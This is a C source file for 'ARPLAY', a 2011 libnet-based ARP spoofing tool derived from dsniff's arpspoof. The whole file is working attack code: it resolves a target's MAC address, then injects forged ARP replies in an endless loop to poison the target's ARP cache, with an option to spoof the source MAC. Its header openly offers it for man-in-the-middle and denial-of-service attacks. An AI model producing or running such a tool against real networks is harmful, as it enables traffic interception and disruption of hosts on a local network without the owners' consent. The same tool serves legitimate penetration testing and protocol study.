/*********************************************************************************************
*                                       [ ARPLAY ] 
* Version: 0.1
* Year: April 19 2011
* Author: Sebastien Dudek (FlUxIuS)
* Requirements: GCC and Libnet 1.x (newer version)
*---------------------------------------------------------------------------------------------
* ARPLAY is a tool based on dsniff's arpspoof from Dug Song for newer
* versions of libnet (undocumented...) with some "cool" ARP stuff and performances.
* It allows you to play with ARP protocol like sending ARP REQUEST/REPLY,
* performing a Man In The Middle or a DoS.
*
* Have fun ! ;)
*********************************************************************************************/

#include <libnet.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <unistd.h>
#include <net/if.h>
#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <sys/ioctl.h>
#include <string.h>

#define IPV4_STRMAX_LENGTH 15
#define MAX_PERMDEC_DELAY 5 

static libnet_t *l;
static char *device;
static int useFake = 0;

/****************************************************************************
*                                HELPER
****************************************************************************/
static void
helper(void)
{
	fprintf(stderr, "Usage: arpspoof [-s host] [-t target] interface\n\n"
                "Option: -o <Change MAC address source>\n\n");
	exit(1);
}

/****************************************************************************
*      ARP CACHE LOOKUP - lookup the MAC address by IP
*----------------------------------------------------------------------------
* input(1): in_addr_t ip - IP address
* input(2)/output(2): struct ether_addr *ether - Pointer to the MAC Address
****************************************************************************/
int
arp_cache_lookup(in_addr_t ip, struct ether_addr *ether)
{
	int sock;
	struct arpreq ar;
	struct sockaddr_in *sin;

	memset((char *)&ar, 0, sizeof(ar));

	strncpy(ar.arp_dev, libnet_getdevice(l), sizeof(ar.arp_dev));

	sin = (struct sockaddr_in *)&ar.arp_pa;
	sin->sin_family = AF_INET;
	sin->sin_addr.s_addr = ip;
	
	if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
		return (-1);
	}
	if (ioctl(sock, SIOCGARP, (caddr_t)&ar) == -1) {
		close(sock);
		return (-1);
	}
	close(sock);
	memcpy(ether->ether_addr_octet, ar.arp_ha.sa_data, ETHER_ADDR_LEN);

	return (0);
}

/*********************************************************
*                Link Initialisation
*********************************************************/
void
arp_link_init()
{
    char errbuf[LIBNET_ERRBUF_SIZE];

    libnet_destroy(l);
    l = libnet_init(
            LIBNET_LINK_ADV,                        /* injection type : LINK ADVanced */
            device,                                 /* network interface (ex: eth0, wlan0) */
            errbuf);
}

/*********************************************************
*             Convert octal mac address to string
*---------------------------------------------------------
*  input(1): u_char *omac - mac address in octal
*  output: char *mac - mac address in string
*********************************************************/
char *
octalmac2string(u_char *omac)
{
    char *mac = malloc(sizeof(char)*18);
    sprintf(mac, "%2.2x:%2.2x:%2.2x:%2.2x:%2.2x:%2.2x", 
                 omac[0], 
                 omac[1], 
                 omac[2], 
                 omac[3], 
                 omac[4], 
                 omac[5]);
    
    return mac;
}

/****************************************************************************
*          MACstring2Byte - Convert a MAC String to Hex digits
*----------------------------------------------------------------------------
* input(1): char *macstring - String a the MAC address
* input(2)/output(1): u_char *byte - MAC in 6 byte string
****************************************************************************/
void
macstring2byte(char *macstring, u_char *eth)
{
    unsigned int byte[6];
    int i = 0;

    sscanf(macstring, "%02X:%02X:%02X:%02X:%02X:%02X",
               &byte[0], 
               &byte[1], 
               &byte[2],
               &byte[3],
               &byte[4], 
               &byte[5]);

    for(i = 0; i < 6; i++)
        eth[i] = byte[i];
}

/*********************************************************
*                      ARP injector
*---------------------------------------------------------
* input(1): uint32_t target_ip - Target's IP address
* input(2): uint32_t source_ip - Source's IP address
* input(3): uint16_t typeop - Type of Operation
* input(4): u_char *tha - Target's mac address
* ouput: int nb - return the number of bytes written
*********************************************************/
int 
arp_inject(uint32_t target_ip, uint32_t source_ip, uint16_t typeop, u_char *tha, u_char *fake)
{
    libnet_ptag_t t;
    uint32_t sused_ip;
    struct libnet_ether_addr *e;
    u_char *ctha;
    u_char *shw;
    int nb;

    e = libnet_get_hwaddr(l); // Gets the local MAC address

    if ((source_ip == 0) && (typeop == ARPOP_REQUEST))
    { // If it is an ARP REQUEST
        sused_ip = libnet_get_ipaddr4(l); // Get our own ip address
        ctha = (u_char *) "\x00\x00\x00\x00\x00\x00"; // we don't know the mac address
    } 
    else
    { // if we got it in the ARP Cache 
        sused_ip = source_ip;
        ctha = tha;

        if ((useFake == 1) && (fake != NULL)) // We use a fake addresse if it is specified
            shw = fake;
        else // If not we use our MAC address
            shw = e->ether_addr_octet;
    }

    // Buils the ARP packet
    t = libnet_build_arp(
            ARPHRD_ETHER,                           /* hardware addr */
            ETHERTYPE_IP,                           /* protocol addr */
            ETHER_ADDR_LEN,                         /* hardware addr size */
            4,                                      /* protocol addr size */
            typeop,                                 /* operation type */
            shw,                                    /* sender hardware addr */
            (uint8_t *)&sused_ip,                   /* sender protocol addr */
            tha,                                    /* target hardware addr */
            (uint8_t *)&target_ip,                  /* target protocol addr */
            NULL,                                   /* payload */
            0,                                      /* payload size */
            l,                                      /* libnet context */
            0);                                     /* libnet id */
    
    if (t == -1)
    { // Build Error
        fprintf(stderr, "Can't build ARP header: %s\n", libnet_geterror(l));
        libnet_destroy(l);
        exit(1);
    }  

    libnet_autobuild_ethernet(
            tha,                               /* ethernet destination */
            ETHERTYPE_ARP,                     /* protocol type */
            l); 

    nb = libnet_write(l); // Write a prebuilt packet to the network

    if ((typeop == ARPOP_REQUEST) && (nb != -1))
    { // Message for an ARP REQUEST
        fprintf(stderr, "%s 0806 42: arp who-has %s tell %s\n",
                        octalmac2string(tha),
                        libnet_addr2name4(target_ip, 0),
                        libnet_addr2name4(sused_ip, 0));
    }
    else if ((typeop == ARPOP_REPLY) && (nb != -1))
    { // Message for an ARP REPLY -> poisonning
        fprintf(stderr, "%s 0806 42: arp reply %s is-at ",
                            octalmac2string(tha),
                            libnet_addr2name4(sused_ip, 0));
        fprintf(stderr, "%s\n",
                            octalmac2string(shw));
    } 
    else if (nb == -1)
    { // No written packet --> link reinitialisation
        fprintf(stderr, "Packet error: the link will be reinitialised");
        arp_link_init();
    }

    return nb;
}

/****************************************************************************
*         ARP FORCE - Force the kernel to get the ARP replies
*----------------------------------------------------------------------------
*  input(1): uint32_t dst - Destination's IP Address
****************************************************************************/
static int
arp_force(uint32_t dst)
{
	struct sockaddr_in sin;
	int i, fd;
	
	if ((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
		return (0);

	memset(&sin, 0, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = dst;
	sin.sin_port = htons(67);
	
	i = sendto(fd, NULL, 0, 0, (struct sockaddr *)&sin, sizeof(sin));
	
	close(fd);
	
	return (i == 0);
}


/***************************************************************
*     ARP FIND - Find a MAC address of an IP ADDRESS
*---------------------------------------------------------------
*  input(1): uint32_t ip - Target's IP address
*  input(2)/output(2) ether_addr *mac - Target's MAC Address
*  output: 1 -> SUCCESS / 0 --> FAIL! 
***************************************************************/
static int
arp_find(uint32_t ip, struct ether_addr *mac, u_char *fake)
{
	int i = 0;
        int nb_pkt = 0;

	do {
		if (arp_cache_lookup(ip, mac) == 0)
                    return (1);

                arp_force(ip); // We force the ARP CACHE in the kernel
		nb_pkt = arp_inject(ip, 0, ARPOP_REQUEST, "\xff\xff\xff\xff\xff\xff", fake); // Who has this f**** ip ?
		sleep(1);
	}
	while (i++ < 3);


        printf("\nWrote %d byte ARP REQUEST packet.\n\n", nb_pkt);

        return (0);
}

/**********************************************************************************
*                  ARP CACHE POISONNING FUNCTION
*----------------------------------------------------------------------------------
*  input(1): uint32_t source_ip - The Source's IP
*  input(2): uint32_t target_ip - The Target's IP
*  input(2): u_char *tha - Target's MAC Address pointer
*  input(3): int delay - Time Delay for each ARP REPLY
**********************************************************************************/
void
arp_cache_poisoning(uint32_t source_ip, uint32_t target_ip, u_char *tha, int delay, u_char *fake)
{
    while (1)
    {
        arp_inject(target_ip, source_ip, ARPOP_REPLY, tha, fake); // Inject an ARP REPLY for a given mac address, source's ip to a target's ip
        sleep(delay); // sleep for <delay>sec
     }
}

/************************************
*       The Main program
************************************/
int
main(int argc, char *argv[])
{
    int c, nb_pkt;
    char errbuf[LIBNET_ERRBUF_SIZE];
    uint32_t target_ip;
    uint32_t source_ip;
    u_char *tha;
    struct ether_addr target_mac;
    struct libnet_ether_addr *e;
    extern char *optarg;
    extern int optind;
    int delay = 2; // 2 sec by default
    u_char *fake = NULL;

    // Get the device from input
    if (argc > 2)
    {   
        while ((c = getopt(argc, argv, "t:d:s:o:i?V")) != -1)
        {
	    switch (c)
            {
		case 't': // target's ip
                    if (strlen(optarg) <= IPV4_STRMAX_LENGTH)
                        target_ip = libnet_name2addr4(l, optarg, 1);
                    else {
                        helper();
                        exit(0);
                    }
                    break;
                case 's': // victim's ip
                     if (strlen(optarg) <= IPV4_STRMAX_LENGTH)
                         source_ip = libnet_name2addr4(l, optarg, 1);
                     else {
                        helper();
                        exit(0);
                     }
                     break;
                case 'd': // the delay
                     if (strlen(optarg) <= MAX_PERMDEC_DELAY)
                         delay = atoi(optarg);
                     break;
                case 'o': // Fake mac address
                     fake = (u_char *) malloc(sizeof(u_char)*6);
                     macstring2byte(optarg, fake);
                     useFake = 1;
                     break;
                default:
                     printf("%c", c);
                     helper();
                     break;
             }
         }
        argc -= optind;
	argv += optind;

        if (argc != 1)
        {
            helper();
            exit(0);
        }
        else
            device = argv[0]; // Interface

    }
    else // if it fails --> display an helper & quit
    { 
        helper();
        exit(0);
    }

   // arp_link_init(); // Init the LINK injection
    l = libnet_init(
            LIBNET_LINK_ADV,                        /* injection type : LINK ADVanced */
            device,                                 /* network interface (ex: eth0, wlan0) */
            errbuf);

    if (l == NULL) // If it isn't initialised --> ERROR!
    {
        fprintf(stderr, "\nError %s: Check if the device is set correctly\n", errbuf);
        exit(EXIT_FAILURE);
    }
    else
    {
        printf("Interface:\t%s\n", libnet_getdevice(l));

        e = libnet_get_hwaddr(l); // Get the local MAC address

        if (e == NULL)
        {
            fprintf(stderr, "Can't get hardware address: %s\n", libnet_geterror(l));
        }
        else if (target_ip)
        {
            printf("Your MAC address:\t %s \n", octalmac2string(e->ether_addr_octet));

            printf("Target's ip: %s\n", libnet_addr2name4(target_ip, 1));

            if (arp_find(target_ip, &target_mac, fake))
            {
                printf("\n%c[%d;%d;%dm[Target's MAC found at: %s]%c[%d;%d;%dm\n\n", 
                           0x1B, 1, 31, 32, 
                           octalmac2string(target_mac.ether_addr_octet), 
                           0x1B, 0, 0, 0);

                if (source_ip)
                    arp_cache_poisoning(source_ip, target_ip, target_mac.ether_addr_octet, delay, fake);
                else
                    printf("Error with the victim's ip address!");
            }
            else
            {
                printf("\n\t%c[%d;%dmError with the target's ip address!%c[%d;%d;%dm\n\n", 
                           0x1B, 1, 31,
                           0x1B, 0, 0, 0);
            }
        }
    }

    libnet_destroy(l);

    return 0;
}
